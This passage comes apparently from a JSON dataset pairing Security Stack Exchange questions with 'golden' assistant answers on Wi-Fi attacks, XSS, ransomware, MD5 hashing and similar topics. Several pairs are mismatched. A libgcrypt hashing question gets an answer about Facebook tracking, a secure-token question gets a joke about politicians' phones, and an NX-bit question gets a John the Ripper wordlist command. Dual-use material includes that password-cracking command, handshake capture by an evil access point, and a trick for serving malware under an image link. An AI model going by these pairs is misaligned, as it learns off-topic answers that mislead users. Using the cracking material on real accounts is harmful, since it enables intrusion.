been run to remove the keys from memory.</li>\n<li>the attacker has had no way to observe the key entry prior to stealing the device.</li>\n</ul>\n\n<p>Honestly - I'd go with disk encryption.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>If I copied the wifi essid and channel and did a de-authentication to the clients of the wifi that I want to hack and started a wifi of my own with the same essid, bssid and channel and I started capturing the packets, will the clients send the password to my wifi?\n<br>\nSorry if it's a stupid question or something, but if it's possible how?</p>\n\n\nAssistant:",
        "golden_answer": " <p>I'm going to assume you mean WPA2-Personal AES in particular in this answer.  If you mean WPA2-Enterprise, it's a whole different kettle of fish, and if you mean anything less, the access point owner (and perhaps users) should upgrade.</p>\n\n<p>Essentially, the answer is no, a MITM \"Evil Access Point\" never gets the actual passphrase.  They pass a nonce (salt) back and forth, information on protocols supported, etc., but both the Access Point and the Station construct the key themselves.</p>\n\n<p>Therefore, an evil access point cannot \"phish\" the key from the client during 802.11 operations.</p>\n\n<p>You can see this \"in action\" in sniffer traces at <a href=\"https://supportforums.cisco.com/document/100611/80211-sniffer-capture-analysis-wpawpa2-psk-or-eap\" rel=\"nofollow\">Cisco's 802.11 Sniffer Capture Analysis - WPA/WPA2 with PSK or EAP</a></p>\n\n<p>Now, an Evil Access Point that can hear both the Good Access Point and the Station can capture 4-way handshakes and then use the usual tools to perform brute-force, mask, and rules-based dictionary attacks, but it doesn't need to broadcast anything to capture that if the clients are authenticating on their own.</p>\n\n<p>For a phishing attack, an attacker is down to sending emails, or having their Evil Access Point not use WPA2, which <em>should</em> be a red flag to users.</p>\n\n<p>If you are using WPA2-Enterprise, perhaps try the surprisingly readable <a href=\"https://cs.gmu.edu/~yhwang1/INFS612/Sample_Projects/Fall_06_GPN_6_Final_Report.pdf\" rel=\"nofollow\">Benefits and Vulnerabilities of Wi-Fi Protected Access 2 (WPA2) </a>, which does cover other standards.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Is it possible, with a normal wifi adapter, to detect present wifi devices in the surrounding? Let's say, is it possible to detect an Iphone with wifi switched on in the range of my wifi adapter?</p>\n\n<p>Perhaps it's possible to create a fake AP with an ESSID and encryption thats stored in the favorites list of the device that should be detected, but actually I am searching for a more generic way, without knowing the favorite networks.</p>\n\n<p>Also, I remember I had found special hardware once for this purpose, but again, I am looking for a method where standard hardware can be utilized.</p>\n\n\nAssistant:",
        "golden_answer": " <p>You will need a wireless nic that permits a 'monitor' mode, and that requires some special drivers and special nics. </p>\n\n<ul>\n<li>Kismet's <a href=\"http://www.linux-wlan.org/docs/wlan_adapters.html.gz\">list</a> of cards for Linux</li>\n<li><a href=\"http://airodump.net/testing-wifi-cards-wireless-hacking/\">tests</a> on different cards</li>\n<li><a href=\"http://hakshop.myshopify.com/products/wifi-pineapple\">pineapple</a> device (special device)</li>\n<li><a href=\"http://www.riverbed.com/us/products/cascade/wireshark_enhancements/airpcap.php\">airpcap</a> nic (specialized nic for Windows)</li>\n</ul>\n\n<p>Once you get a card, you will need software to deal with the data and <a href=\"http://www.kismetwireless.net/index.shtml\">Kismet</a> is the leader in this area right now. </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Suppose you're constantly being menaced by high profile hackers and agencies that try to intercept messages sent between you and a friend.</p>\n\n<p>The question is: what's the safest way to send messages to him without any malicious user or agency being able to either:</p>\n\n<ol>\n<li>Intercept and decrypt yours or your friend's messages.</li>\n<li>Interrupt your communication by means of <a href=\"http://en.wikipedia.org/wiki/Man-in-the-middle_attack\" rel=\"nofollow\">MiTM</a> or DDoS. Do cloud servers hosted in different parts of the world help offloading DDoS traffic and making it difficult to shut down the servers? What about multiple proxies without any sensible info forwarded in the headers, so that your internet provider doesn't know about the server you're contacting in case someone manages to seize internet browsing logs?</li>\n<li>Any other attack such as <a href=\"http://en.wikipedia.org/wiki/Replay_attack\" rel=\"nofollow\">replay attack</a>, <a href=\"http://en.wikipedia.org/wiki/Meet-in-the-middle_attack\" rel=\"nofollow\">Meet-in-the-Middle-Attack</a> and so on that in a nutshell would finally derive message content or lead to impersonation.</li>\n</ol>\n\n<p>Also suppose you're a student and can't afford a powerful laptop to crunch <em>big numbers</em>, so a cryptographically slow algorithm is to exclude to begin with.</p>\n\n<p>This is the situation we're in:</p>\n\n<pre><code>                              C                     B\n                       ----------------     ------------------\n         A             |              |     |                |\n      -------          |    Server    |'''''|     Friend     |\n      | You |''''''''''|              |     |                | \n      -------          ----------------     ------------------\n                 |                              |\n               |                D                 |\n             ---------------------------------------\n             |                                     |\n             |                                     |\n             |      Malicious user or agency       |\n             |                                     |\n             |                                     |\n             ---------------------------------------\n</code></pre>\n\n<p><strong>A</strong> should be able to send anything to <strong>B</strong> through <strong>C</strong> without <strong>D</strong> being able to <em>interact</em>.</p>\n\n<p>Is exchanging the key through <a href=\"http://en.wikipedia.org/wiki/RSA_%28cryptosystem%29\" rel=\"nofollow\">RSA</a> and using it as encryption/decryption with say AES128 enough? What about using both RSA and PGP so that after you decrypt with the RSA key you have to decrypt with PGP too? Or is that superfluous?</p>\n\n<p>I've thought about a sort of <em>MAC-then-encrypt-and-encrypt-again</em> schema: <code>AES128(Message + RSA pub key) + (PGP pub key + nonce) &lt;-&gt; server &lt;-&gt; ((AES128(Message + RSA pub key) + (PGP pub key + nonce)) - nonce) == PGP priv key == RSA priv key | stop</code></p>\n\n<p>Let's throw a diagram in there once again to understand it better:</p>\n\n<h1><strong>Sender</strong></h1>\n\n<pre><code>             -------------     ---------------    \n             |           |     |             |\n             |  Message  |--+--| RSA pub key |\n             |           |     |             |\n             -------------     ---------------           \n                      \\          /    \n                       \\        /\n                        \\   D  /\n                         \\    /\n                          \\  /\n                           \\/\n                      -------------     -----------------     -----------\n                      |           |     |               |     |         |\n                      |  AES128   |--+--|  PGP pub key  |--+--|  Nonce  |\n                      |           |     |               |     |         |\n                      -------------     -----------------     -----------\n</code></pre>\n\n<h1><strong>Receiver</strong></h1>\n\n<pre><code>                                                                 \\    /\n                      -------------     -----------------     ----\\--/---\n                      |           |     |               |     |    \\/   |\n                      |  AES128   |--+--|  PGP pub key  |--+--|  No/\\ce |\n                      |           |     |               |     |   /  \\  |\n                      -------------     -----------------     ---/----\\--\n                           /       \\                /           /      \\\n                          /         \\              +                    \n                         /           \\            /             \n  ---------------     -----------     +   -----------------            \n  |             |     |         |      \\  |               |\n  |  RSA pubkey |--+--| Message |       \\ |  PGP priv key | &lt;----- Symmetric\n  |             |     |         |        \\|               |\n  ---------------     -----------         -----------------   \n          \\\n           +\n            \\\n         ----------------\n         |              |\n         | RSA priv key | &lt;---- Asymmetric. Only the receiver knows this key.\n         |              |\n         ----------------\n                    \\\n                     \\\n                 -------------\n                 |           |\n                 |  Message  |\n                 |           |\n                 -------------\n</code></pre>\n\n<p>Coupling this with (Perfect)<a href=\"http://it.wikipedia.org/wiki/Forward_secrecy\" rel=\"nofollow\">Forward secrecy</a> <em>would</em> make it even more secure?</p>\n\n<p>The outcome should be one and only one: unbreakability or <strong>very</strong>-slow breakability (that would take hundred years even for a supercomputer) by the malicious user.</p>\n\n<p>If possible add facts, references, specific expertise or anything else that doesn't make your answer opinion based.</p>\n\n\nAssistant:",
        "golden_answer": " <p>Do you really believe that you could detect if your computer was manipulated in a way that one could sniff the plain data directly at the computer or that the encryption software was changed in a way to make sniffing easier?  Do you really believe that your father could do this too? If you downloaded the encryption software: how do you know it does what it claims and only that? If you wrote the encryption software yourself: did you really fully understand all algorithms involved and did you made sure that your implementation is not only correct but uses a proper and secure RNG etc, does not leak information in timing attacks etc?\nCryptography itself is already hard but it only solves a part of the problem, not the whole problem. Don't forget <a href=\"https://xkcd.com/538/\">https://xkcd.com/538/</a>.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I was wondering whether SQL injection is still a thing or if it is mainly extinct due to the fact that I don't hear about corporations being hit by this vulnerability, And the last time I heard an exploitation was a while ago!</p>\n\n<p>And also currently what are the most popular methods of website attacks.</p>\n\n\nAssistant:",
        "golden_answer": " <p>Still a threat? Of course! It's one of the most exploited vulnerabilities out there! Just take a look on the <a href=\"https://codecurmudgeon.com/wp/sql-injection-hall-of-shame/\" rel=\"nofollow noreferrer\">SQL Injection Wall of Shame</a> and see for yourself.</p>\n\n<p>I don't think SQL Injection will ever become extinct. It arises from the fact that humans are writing programs, and humans are not perfect. And as long as we write code, with the deadline arriving at the horizon, we commit mistakes, and let open the door for SQL Injection.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>There is two-step authentication available at gmail and outlook as well. There are some using it, but the majority doesn't. In what cases it is recommended? If I have a strong password what are the chances of abuse?</p>\n\n\nAssistant:",
        "golden_answer": " <p>YES!  There is absolutely sense in using two-factor authentication for personal email!  <a href=\"http://www.codinghorror.com/blog/2008/06/please-give-us-your-email-password.html\">Your personal email is the absolutely most precious account you own!</a>  </p>\n\n<p>Almost every website's \"forgot password\" feature will kindly send an email containing a reset link to your inbox if you forget your password.  </p>\n\n<p><em><strong>Once an attacker has access to your email, they can access pretty much any account you have just by using the \"forgot password\" feature on any website you're registered with under that email address.</em></strong></p>\n\n<p>Does your bank send you statements via email?  Perfect!  The attacker even knows which bank website to go to to get your info.  Other creditors?  Same thing.</p>\n\n<p>Even if your password is strong, you have no way of knowing how it's protected on the server. Suppose they're storing it in plain text, or in an easily decrypted format, and <a href=\"http://thenextweb.com/insider/2013/03/06/despite-its-efforts-to-fix-vulnerabilities-yahoos-mail-users-continue-reporting-hacking-incidents/\">they get breached (repeatedly)</a>.  Or someone <a href=\"http://thenextweb.com/insider/2013/04/09/walmarts-vudu-resets-all-customer-passwords-after-march-office-break-in-leads-to-hard-drive-theft/\">breaks in and steals their hard drives with your data</a>.  The strength of your password means squat in these scenarios.</p>\n\n<p>As others have noted, <a href=\"http://www.theatlantic.com/technology/archive/2012/09/the-password-fallacy-why-our-security-system-is-broken-and-how-to-fix-it/262155/\">passwords are ultimately a \"broken technology\"</a>.  Given the high value of your personal email - the fact that losing it can expose ALL your accounts and the broken nature of the whole username/password paradigm, using two-factor authentication is (IMO) a <strong><em>must</em></strong>.</p>\n\n<p>More here: <a href=\"http://www.codinghorror.com/blog/2012/04/make-your-email-hacker-proof.html\">http://www.codinghorror.com/blog/2012/04/make-your-email-hacker-proof.html</a></p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>May be it 's not a question for information security stack exchange and if it's true excuse me for my mistake.</p>\n\n<p>I want to understand how this code works:</p>\n\n<pre><code>char *s = \"1\";\nchar *s_2 = \"2\";\n\nunsigned char *x;\n\ngcry_md_hd_t h;\ngcry_md_open(&amp;h, GCRY_MD_SHA256, GCRY_MD_FLAG_SECURE); \n\ngcry_md_write(h, s, strlen(s)); \ngcry_md_write(h, s_2, strlen(s_2)); \nx = gcry_md_read(h, GCRY_MD_SHA256); \n</code></pre>\n\n<p>Well, i have two schemes and both of them don't work.</p>\n\n<ol>\n<li>x = SHA256(SHA256(\"1\") || SHA256(\"2\")).</li>\n</ol>\n\n<p><code>SHA256(\"1\") = 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b;</code></p>\n\n<p><code>SHA256(\"2\") = d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35</code></p>\n\n<p><code>SHA256(SHA256(\"1\") || SHA256(\"2\")) = 4295f72eeb1e3507b8461e240e3b8d18c1e7bd2f1122b11fc9ec40a65894031a</code></p>\n\n<ol start=\"2\">\n<li>x = SHA256(SHA256(\"1\") || \"2\")</li>\n</ol>\n\n<p><code>x = a29972da68d930f3bd40fa9c150137c780cf55f4d7187335a9f4b9043736f02a</code></p>\n\n<p>But the result <code>x</code> (output from program) is</p>\n\n<p><code>6b51d431df5d7f141cbececcf79edf3dd861c3b4069f0b11661a3eefacbba918</code></p>\n\n<p>How does this code work??</p>\n\n\nAssistant:",
        "golden_answer": " <p>Short answer: yes.</p>\n\n<p>Everything you send to Facebook is stored and processed, and that includes more than posts or pictures. All your likes, all links you click, all friends you check, how much time you spend on Facebook, how many times you use it, which hours you check. Everything.</p>\n\n<p>They earn money by knowing everything possible about you and everyone you know. Making a profile of you so detailed that they can predict what you will like or dislike, and send you exact the things you like.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>If we consider that JavaScript is not disabled on front-end server.\nIf so, can we configure server to run all javascript in some kind of sandbox. Something like codepen for example.</p>\n\n\nAssistant:",
        "golden_answer": " <p>You really have two questions here. </p>\n\n<blockquote>\n  <p>Does DOM XSS work on pages that don't use js?</p>\n</blockquote>\n\n<p>I'm assuming that you mean <a href=\"https://www.owasp.org/index.php/DOM_Based_XSS\" rel=\"nofollow\">DOM based XSS</a>, and in that case, no. DOM based XSS requires that user input is put into the DOM client side, which happens via JavaScript.</p>\n\n<p>A simple example is JavaScript reading out part of a URL and writing it into the document.</p>\n\n<blockquote>\n  <p>Can an XSS attack be done on a static page that doesn't use any JavaScript?</p>\n</blockquote>\n\n<p>Sure. If you echo user input into the static page - which, in contrast to DOM based XSS, happens server side -, a user can simply add <code>script</code> tags themselves, or enter a JavaScript context via various event attributes.</p>\n\n<p>If you know that you will only have static pages, you can prevent the execution of injected JavaScript by using a <a href=\"https://en.wikipedia.org/wiki/Content_Security_Policy\" rel=\"nofollow\">Content Security Policy</a>. Note that it is the job of the browser to actually enforce this policy, so this may not help with older browsers, and proper defenses against XSS should still be applied.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I just read about the lockbit ransomware, which is widely used. What really surprised me is that the ransomware only encrypts the first 4kb of each file (for better speed, considering it will encrypt like 100k files in total).</p>\n<p>But isn't it ineffective to only encrypt the first 4kb? Imagine you have a huge database file which is about 10GB large. Shouldn't it be somehow restorable if only the first 4KB are encrypted?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Of course it is possible to restore <em><strong>the rest</strong></em> of the file. But the trouble is this:</p>\n<ul>\n<li>you need tools and expertise to do so</li>\n<li>not everyone has this capability</li>\n<li>the cost to recover most of 100k files could be more than the ransom</li>\n<li>recovery like this takes time</li>\n<li>there is still data loss</li>\n</ul>\n<p>Nothing in security, or ransomware, is a silver bullet meant to be 100% effective. Things only need to be effective <em>enough</em>.</p>\n<p>The question becomes, &quot;why only encrypt part of the file?&quot; And that's the more interesting question. Not only is it faster, but it is harder to detect and requires less disk and memory space.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I'm implementing a model which I'll have to reupdate the users, so I want to deliver a unique link to the users and after confirmed the update, I expire that link, so I prevent reusing that link.</p>\n<p>How do I generate a random secure token for that?</p>\n<p>The performance of checking if the token was already visited isn't a problem, it will not affect a huge number of users.</p>\n\n\nAssistant:",
        "golden_answer": " <blockquote>\n<p>I wonder what corporations and politicians and oil barons do to\nprotect their devices from targeted hacking?</p>\n</blockquote>\n<p>Ask Jeff Bezos or Angela Merkel, they'll know.\nOh wait ...</p>\n<p>It always depends on your adversary. There's a difference between Joe hacker and the NSA.</p>\n<p>The average Smartphone usually does not expose any public internet services itself and is often behind some NAT anyways. So theoretically no one from the outside can connect to it directly. Often you &quot;invite&quot; attackers by connecting to their phishing websites, installing some crap app ...\nTelemetry/Tracking is also just some kind of legal version of exfiltration.</p>\n<p>Preventing exfiltration is nice in theory but in practice only limiting traffic to port 443 and 80 still gives the attacker the ability to exfiltrate data over those ports. Not to mention some lower level stuff like WIFI, Bluetooth, mobile network ...\nSmartphones are made to communicate in many ways.</p>\n<p>The average politician targeted by the average nation state better does not do any stuff on his phone which could have negative impacts on him. Like storing all his duck pics ...</p>\n<p>The true chad politician, however, would store all his duck pics there on purpose because a) remove the attack vector of some moral outrage and b) because the images exploit some vulnerabilities on the attackers system and send all their duck pics to youduck.com\n2:0</p>\n<p>You'd better prevent or detect the step which happens before exfiltration i.e. compromise. You'd need to know what the system does normally and when it misbehaves. You also need to know if normal=desired (see telemetry ...) That's a lot of work. iptables/firewalling is only a small part of it</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>A company I work for wanted to use a VPN client called <a href=\"http://www.juniper.net/us/en/products-services/security/junos-pulse/\" rel=\"nofollow noreferrer\">Junos Pulse</a> to connect to their file server.</p>\n\n<p>I am on my personal computer, and connected to my personal wifi. I was not using their VPN for internet access, but rather just to access their files.</p>\n\n<p>Would my internet activity have been sent to the company through VPN? Should I uninstall Junos Pulse altogether to preserve my privacy? Anything else I need to do to ensure I'm completely off this company's network?</p>\n\n<p>I have already looked at this related question:\n<a href=\"https://security.stackexchange.com/questions/31086/can-my-company-access-my-computer-via-the-vpn\">Can my company access my computer via the VPN?</a></p>\n\n<p>As well as some others around the web. I do understand that VPN clients will monitor your internet browsing but the part I don't understand is that in this case I wasn't using the VPN to access the net, I was still on my own wifi. So is this still the case for me?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Sign out of Junos to keep your traffic off their network, there is no need to uninstall the VPN client completely.</p>\n\n<p>If you had signed in to Junos, it was routing all your network traffic through their VPN. Although you were on your own Wifi, when you logged in to Junos, it would have redirected all your traffic into their VPN.</p>\n\n<p>There is a chance that they had configured the VPN client to use split-tunneling to minimize the traffic which was sent on their network. You'll have to ask their systems department to find out.</p>\n\n<p><a href=\"http://www.juniper.net/assets/us/en/local/pdf/datasheets/1000357-en.pdf\" rel=\"nofollow\">This</a> is a link to a juniper datasheet, look under the features and benefits section.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Please see the upload code below. the method is called within a try, catch. If the code for the image utilities is needed, just say. Basically, everything is handled in raw bytes and then stored to the DB. I currently render images as base 64 but am moving towards using the bottom snippet in web api. </p>\n\n<p>My main thoughts are:</p>\n\n<ul>\n<li>The image is uploaded in raw bytes. While it could contain a virus it wouldn't run</li>\n<li>The server has a max file size set, and prior to this method the user is authenticated, and are checked they are not concurrently downloading any other files (one at a time) with a max upload of 100 images an hour. This would, I hope, stop a specific image DoS.</li>\n<li>Because the image is modified to be a certain size (100 x 100) then if it's not a valid image type this would throw an exception and everything is binned</li>\n<li>I could add a white list on file extensions before this if you can see any potential issues?</li>\n<li><p>I believe Image.FromStream is safe from an overflow attack</p>\n\n<pre><code>public string StoreProfileImage(ImageViewModel model, string userId)\n{\n        var postedImg = model.Image;\n        var image = Image.FromStream(postedImg.InputStream, true, true);\n        if (image != null)\n        {\n            Rectangle rect = new Rectangle();\n            rect.X = (int)Math.Floor(model.x / model.scale);\n            rect.Y = (int)Math.Floor(model.y / model.scale);\n            rect.Width = (int)Math.Floor(model.width / model.scale);\n            rect.Height = (int)Math.Floor(model.height / model.scale);\n\n            // crop the image\n            var croppedImg = ImageUtilities.CropImage(image, rect.Height, rect.Width, rect.X, rect.Y);\n            // resize to max pic size\n            var resizedImg = ImageUtilities.ResizeImage(100, 100, croppedImg);\n            // convert to bytes\n            byte[] imageData = ImageUtilities.ImageToByteArray(resizedImg);\n\n            using (var db = new DbContext())\n            {\n                var userImage = new UserImage\n                {\n                    ImageBytes = imageData,\n                    ImageName = postedImg.FileName,\n                    UserId = userId,\n                    IsProfileImage = true\n                };\n\n                // add new users image\n                db.UserImage.Add(userImage);\n                db.SaveChanges(); \n            }\n            return ImageUtilities.BytesToBase64(imageData);\n        }\n        return null;\n    }\n</code></pre></li>\n</ul>\n\n<p>Rendering snippet</p>\n\n<pre><code> HttpResponseMessage result = new HttpResponseMessage(HttpStatusCode.OK);\n result.Content = new ByteArrayContent(image.ImageBytes);\n result.Content.Headers.ContentType = new MediaTypeHeaderValue(\"image/png\");\n return result;\n</code></pre>\n\n\nAssistant:",
        "golden_answer": " <p>While sanitizing the image by resizing it is a good idea there were several critical bugs in image processing libraries in the past.  Which means that the process of resizing the image itself could trigger such a bug and thus cause DOS with a complexity attack against the image manipulation library or even remote code execution. That's why the process of resizing should be done within some kind of VM or sandbox and should be also limited in CPU and memory usage.</p>\n\n<p>And then there are several ways of resizing. I'm not familiar with the implementation you use but it might be that the meta data of the image are preserved (i.e. comments, flags, creation time etc) and thus might still be used later inside an attack. So you better convert the image first into some format like PPM which has no ability to store meta data to remove any kind of potential harmful meta data.</p>\n\n<p>I'm also not familiar what your code of storing the image in the database really does in the implementation. Hopefully it uses parameter binding or similar techniques, because otherwise a malicious image might also be used for an SQL injection attack.</p>\n\n<p>As for reading the image you should be aware that browsers often ignore the content-type you send depending on the context. This means if the URL is used as the source for the script tag the image will be interpreted as script, even if the content type is image/png (Chrome does not allow this but others do). Similar context enforcement can be done with a forced download. For example you could sent malware hidden by an image type with <code>&lt;a href=image.png download=malware.zip&gt;</code> and it might even have the correct magic bytes for the image type at the front because extraction of ZIP files often ignores junk at the beginning of the ZIP file. But if you removed the meta data like I've recommended you are probably safe against this kind of misuse.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have been reading about XD/NX bit used in Memory Pages for security. I understand it is a security feature that can help reduce system exposure to viruses and malicious code. If enabled, processor prevents the execution of code in data-only memory pages.</p>\n<p>However, I want to now understand:</p>\n<ul>\n<li>What does it not help to protect against?</li>\n<li>When should it be used?</li>\n</ul>\n<p>Any answers/hints would be appreciated!</p>\n\n\nAssistant:",
        "golden_answer": " <p>You can do this easily with john's <code>--stdout</code> flag:</p>\n<pre><code>$ cat words.txt                                                           \nab\nword\nwords\nwordss\nreallylongword\n\n\n$ john --stdout --wordlist=words.txt --rules=:'c$8$7$6$5$.' --min-length=9 --max-length=12 &gt; mywords.txt\n[...]\n\n$ cat mywords.txt \nWord8765.\nWords8765.\nWordss8765.\n</code></pre>\n<p>You can either use one of the dictionaries include in Kali (such as the one @mti2935 suggested), or one you download. You can also set the minimum and maximum lengths to whatever you want.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Core network --> Firewall Internal Zone --> Inner DMZ Firewall --> Outer Firewall --> Internet Based User</p>\n\n<p>I can't think of any reason why \"Inner DMZ firewall\" would make this topology more secured from a network security perspective. Assume you take out the \"Inner DMZ firewall\" so you're left with Core network --> Firewall Internal Zone --> Outer Firewall --> Internet Based User. </p>\n\n<p>For some reason having an additional firewall definitely sounds more safer. Thoughts?</p>\n\n\nAssistant:",
        "golden_answer": " <p>I will assume that clients answer a series of <code>n</code> boolean questions.  The server stores their answers in such a way that you that admin can not know their responses.  Then the server identifies pairs of clients with identical responses.</p>\n\n<p>Then could not you the admin (or anyone really) create <code>2^n</code> dummy accounts (all possible responses to the boolean questions).  The server forms pairs.  Now you know everyone's responses.</p>\n\n<p>So I do not think this is possible.  (Did I miss something?)</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Cloudflare offers 3 free SSL options: Flexible SSL, Full SSL, and Full Strict SSL.</p>\n\n<p>The article “<a href=\"https://scotthelme.co.uk/cloudflares-great-new-features-and-why-i-wont-use-them/\">CloudFlare’s great new features and why I won’t use them</a>” explores the shortcomings of the Flexible and Full (non-strict) SSL options.</p>\n\n<p>The Full Strict SSL option encrypts clients’ connections to Cloudflare, and also Cloudflare’s connection to origin server — for which a Valid CA signed certificate is required. However, even with this option selected for your site, Cloudflare must be trusted, as they are the middleman, receiving the data, decrypting it and then encrypting it on its way to the origin server — and vice versa. <em>Additionally, they must be trusted to <strong>actually</strong> require valid certificates from origin servers.</em></p>\n\n<p>So, this setup allows Cloudflare to monitor, record, and modify any traffic between clients and the origin servers.</p>\n\n<p>The fact that they can do this is a huge security concern, is it not? It cheapens the SSL system by appearing (to an average user) that your connection to the site you are visiting is secure cryptographically end-to-end, rather than the reality, whereby trust in Cloudflare is required.</p>\n\n<p>How could Cloudflare offer SSL without requiring users to trust them?</p>\n\n\nAssistant:",
        "golden_answer": " <p>From what I understand, no, Cloudflare couldn't work any other way.</p>\n\n<p>Cloudflare analyses the connection before passing it to your webserver to ensure that it's correct and coming from a legitimate client.  In order to do this, it needs to be able to see the contents of each packet from and to your server.</p>\n\n<p>With SSL/TLS, each packet is encrypted and therefore not visible to Cloudflare.  It needs to be able to decrypt any traffic before it can analyse it.  To do that, it needs to have the private key for the cert used to encrypt the traffic.  </p>\n\n<p>The only way around this I see, is if Cloudflare sold its application that you could then self host.  That still requires trusting the application (it may forward information to Cloudflare's servers, for instance), but at least it wouldn't be hosted elsewhere and totally out of your control.  This would be a trade off, as you'd lose Cloudflare's distributed network.  You would still have some benefits (anything implemented in software e.g. SQL injection protection), but would lose anything relying on the large network  capacity (e.g. some DDoS protection).</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>i'm wondering how safe it is to use <code>createHTMLDocument</code> to do HTML sanitization. I've tried to implement it like this:</p>\n\n<pre><code>function sanitize(string) {\n  var elm = document.implementation.createHTMLDocument().body;\n  elm.innerHTML = string;\n  // traverse and filter elm to only allow whitelisted elements and attributes\n  // e.g. use https://github.com/gbirke/Sanitize.js\n  var cleaned_fragment = whitelist_filter(elm);\n  elm = document.implementation.createHTMLDocument().body;\n  elm.appendChild(cleaned_fragment);\n\n  return elm.innerHTML;\n}\n</code></pre>\n\n<p>It seems to work fine with all XSS attacks i've throw at it (no script evaluation or requests triggered). But I got a feeling it might be a bad idea, im I missing something?</p>\n\n<p>I've created a <a href=\"http://jsfiddle.net/sYdJy/\">jsfiddle if someone wants to experiment</a>.</p>\n\n\nAssistant:",
        "golden_answer": " <p>You should use the <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/DOMParser\" rel=\"noreferrer\"><code>DOMParser</code></a> to parse HTML when available, and only fall back to <code>DOMImplementation.createHTMLDocument</code> if the former is unavailable.</p>\n\n<p>In Opera Presto, I observed network activity when I passed <code>&lt;img src=...&gt;</code> (but not <code>&lt;video&gt;</code>).<br>\nInternet Explorer 9- is worse: media, styles and event listeners will be activated with this method. IE10+ supports DOMParser, so if your audience uses IE10+, then you're safe.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I am learning smart contract programming on Ethereum (using Solidity) and realizing that security is highly important here. Why? Because of 2 reasons: they deal with high-stake financial transactions, and smart contracts are immutable once you deploy them. Hence, you have to be really sure about the safety of your code before deploying it. To ascertain this, several static analysis tools are being built and many researchers are actively publishing papers regarding their security.</p>\n<p>Now, the security of a smart contract ultimately boils down to safeguarding the internal private variables being changed by a &quot;non-owner&quot; (of the contract). There are several variables and functions, a few public entry-points into the smart contract, and you have to ensure that no entry point leads to malicious consequences.</p>\n<p>However, this kind of safeguarding sounds eerily familiar. Isn't that what we have been doing when designing web APIs or classes or RPCs or just any kind of architecture where calls from outside are being made to our internal code base? What exactly sets smart contracts apart in terms of security?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Ethereum-style smart contracts are entirely public and immutable, whereas classic web APIs can have private data, private logic, and can be updated at any time by the server operator. Thus, we have different security goals in each setting.</p>\n<p>The important property of a smart contract is that it works exactly as expected. Since smart contracts might control significant funds, there is substantial motivation in applying formal methods and static analysis to verify correctness as far as possible. You are correct that there is already a large body of work in that field, but there's always room for further developments and for applying existing techniques to new programming languages and new problems.</p>\n<p>You are potentially wrong in assuming that smart contracts have entry points and private data. Anyone can run the smart contract and observe its internal state, unless cryptographic techniques are used to protect the data. In principle, anyone could also falsify the output of the smart contract, but that is useless since the Blockchain uses a consensus mechanism. If we look at the classic C-I-A triad of security goals, Ethereum-style smart contracts do ensure the integrity of computations (via the consensus mechanism, e.g. proof of work or proof of stake) and their availability (through the distributed blockchain design). But they do not afford confidentiality except through the usage of cryptographic techniques.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I've recently discovered that one of our (strictly internal facing - no external risk unless other systems are completely compromised) platforms is storing passwords by salting and then MD5 hashing them. According to the Wikipedia article, MD5 is very vulnerable to collisions, but only theoretically vulnerable to preimage attacks (cost being ~2<sup>123</sup>). The article cites the preimage attack being created in 2009, however - quite a long time ago! I am unable to find any significantly more recent information about MD5 vulnerability to preimage attacks.</p>\n\n<p>As a result, my question is this: Have there been any vulnerabilities found in MD5 that would allow a preimage attack on a hashed password, either to find a collision or determine the password, with a cost of less than 2<sup>123</sup>?</p>\n\n<p>As a follow up question, how important is it that I attempt to pressure the vendor into moving off MD5 for password hashing? Is this major and immediate vulnerability, or more of a theoretical future one (should the database be breached).</p>\n\n\nAssistant:",
        "golden_answer": " <p>MD5 should be considered completely compromised for password use, and has been \"deprecated\" for passwords for a long time.  It doesn't even have to involve preimage attacks or explicit vulnerabilities.  It is as simple as the fact that the hash rate for modern GPU stacks against MD5 is so fast that you can feasibly brute force nearly any password (okay, I exaggerate slightly)</p>\n\n<p><a href=\"https://securityledger.com/2012/12/new-25-gpu-monster-devours-passwords-in-seconds/\" rel=\"nofollow noreferrer\">This is an extreme setup</a>, but it can run through almost 200 billion hashes per second.  That means it can guess about 200 billion passwords every second if they are hashed as MD5.  I don't have an exact translation but as you can imagine, being able to try 200 billion password guesses every second means that even strong passwords can get easily cracked.  The article suggests that it can crack a 14 character windows XP password (which is slightly weaker, and has roughly double the hash rate as for MD5) in just 7 minutes.</p>\n\n<p>More realistic hashing setups might hash passwords at roughly a tenth of that rate, but even still it is quite possible to brute force any realistic password that is hashed with MD5.</p>\n\n<p><strong>Edit to address the second half of your question</strong></p>\n\n<p>Is this an immediate threat?  Yes and no.  In practical terms it is a theoretical threat, as your passwords will only be vulnerable in the event that this internal system is breached.  However, the more you read about the very involved kind of hacks that criminals go through when they want something, the more you realize how important it is to have thorough security at every level of the system.  I personally believe that internal systems should be as secure as external systems.  Here is a good example of a time that bad security lead to expensive breaches:</p>\n\n<p><a href=\"https://gizmodo.com/hackers-found-a-new-way-to-rip-off-atms-1818859798\" rel=\"nofollow noreferrer\">https://gizmodo.com/hackers-found-a-new-way-to-rip-off-atms-1818859798</a></p>\n\n<p>Moreover, the other issue is that MD5 has been \"out-of-fashion\" for password storage for quite a long while now.  I would be <strong>very</strong> concerned that the rest of their security is equally out-of-date, and that this internal system of yours is full of security holes.</p>\n\n<p><strong>Another edit</strong></p>\n\n<p>An important thought to keep in mind: with these things an important consideration is the potential damage done in the event of a 